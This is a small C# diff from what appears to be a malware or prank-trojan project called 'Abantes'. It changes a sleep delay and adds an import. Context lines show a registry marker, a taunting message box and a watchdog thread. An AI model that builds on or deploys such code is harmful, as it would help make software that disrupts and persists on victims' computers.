@@ -11,6 +11,7 @@ using System.Diagnostics;
 using Abantes.Properties;
 using Abantes.Payloads;
 using Abantes.Utils;
+using System.Media;
 using Microsoft.Win32.TaskScheduler;
 
 namespace Abantes
@@ -202,7 +203,7 @@ namespace Abantes
                 editKey.SetValue("AbantesWasHere", "1");
                 editKey.Close();
 
-                Thread.Sleep(8000);
+                Thread.Sleep(9000);
 
                 MessageBox.Show("Abantes Wants To Meet You","I Want Too Meet You");
 
@@ -216,7 +217,6 @@ namespace Abantes
                 Thread watchdogThread = new Thread(new ThreadStart(Threads.WathcDogThread));
                 normalThread.Start();
                 watchdogThread.Start();
-                
             }
         }
     }
